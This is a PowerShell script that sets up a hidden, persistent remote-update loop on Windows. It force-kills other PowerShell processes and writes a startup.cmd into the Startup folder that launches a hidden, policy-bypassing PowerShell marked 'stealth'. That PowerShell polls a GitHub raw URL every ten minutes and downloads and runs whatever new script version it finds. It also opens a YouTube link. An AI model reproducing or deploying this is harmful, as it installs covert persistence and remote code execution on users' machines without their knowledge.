[string]$Version = 15
#TODO update this version

echo "Process script starting: $Pid"

### Get credentials ###
#$pass = ConvertTo-SecureString '' -AsPlainText -Force
#$id=($env:UserName)
#$cred = New-Object System.Management.Automation.PSCredential($id,$pass)
#New-PSDrive -Name P -PSProvider FileSystem -Root "C:\" -Credential $cred
#$newfile = "c:\test.txt" 
#New-Item -Path $newfile -ItemType File -Force

#\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run #TODO add startup.cmd here

### Kill all other ps process ###
Get-Process -Name "*PowerShell*" | ForEach-Object {
    if($_.Id -ne $Pid){
        echo "process $_ killed"
        Stop-Process -Id $_.Id -Force
    }
}

### Create starup.cmd ###
#[string]$path = "C:\"
[string]$path = $env:APPDATA
#[string]$FolderName = "\Test\"
[string]$FolderName = "\Microsoft\Windows\Start Menu\Programs\Startup\"
[string]$StartupCmdPath = "$path"+"$FolderName"+"startup.cmd"
#$StartupCmdPath

if(test-path($StartupCmdPath)){
    Remove-Item -Path $StartupCmdPath
    Write-Output "$StartupCmdPath removed"
}
New-Item -ItemType File -Path $StartupCmdPath -Force

$path = $env:APPDATA #override
$FolderName = "\Test\$Version\"
$OrderPath = "$path"+"$FolderName"+"orders.ps1"
$OrderPath
#$ScriptPath = "$path"+"$FolderName"+"script.ps1"
#$ScriptPath

$StartupCode = 'START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -NoLogo -WindowStyle Hidden -file "'+"$OrderPath"+'"' #stealth
#'START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -file "'+"$OrderPath"+'"'

Add-Content $StartupCmdPath $StartupCode

### Create order ###
$OrderCode = 'PowerShell.exe -windowstyle hidden {
	echo "Process order starting: $Pid"
	$update = $true
	while($update){
		#echo "hello"
        $remote_script = $null
		$remote_script = Invoke-WebRequest -URI "https://raw.githubusercontent.com/k4d4m/obey/master/script.ps1" | Select -expand Content
		#$remote_script
		$remote_version = ($remote_script -split '+'''\n'''+')[0]
		$remote_version = $remote_version.substring(19)
        echo "current version = $remote_version"
		
		$Version = '+"$Version"+'
		if($Version -ne  $remote_version){
			echo "New version found: $remote_version"
			break
		}
		else{
			start-sleep -s 600
		}
		#pause
	}
	if($update){
	
		$path = $env:APPDATA #override
		$FolderName = "\Test\$remote_version\"
		$ScriptPath = "$path"+"$FolderName"+"script.ps1"
		#$ScriptPath
		if(test-path($ScriptPath)){
			Remove-Item -path $ScriptPath
		}
		New-Item -ItemType File -Path $ScriptPath -Force
		Add-Content $ScriptPath $remote_script
		if(test-path($ScriptPath)){
			echo "invoking updated script"			
			powershell.exe -executionpolicy bypass -file "$ScriptPath"
			#C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -file $ScriptPath
		}
	}
	echo "Order completed: $Pid"
	Stop-Process -Id $Pid -Force
}'
	
if(test-path($OrderPath)){
    Remove-Item -path $OrderPath
}
New-Item -ItemType File -Path $OrderPath -Force
Add-Content $OrderPath $OrderCode

### Do anything really ###
$IE=new-object -com internetexplorer.application
$IE.navigate2("https://youtu.be/xnKhsTXoKCI")
$IE.visible=$true

### Run order ###
if(test-path($OrderPath)){
	echo "invoking deployed order version: $Version"
	powershell.exe -executionpolicy bypass -file "$OrderPath"
	#C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -file $OrderPath
}

echo "Script completed: $Pid"
Stop-Process -Id $Pid -Force
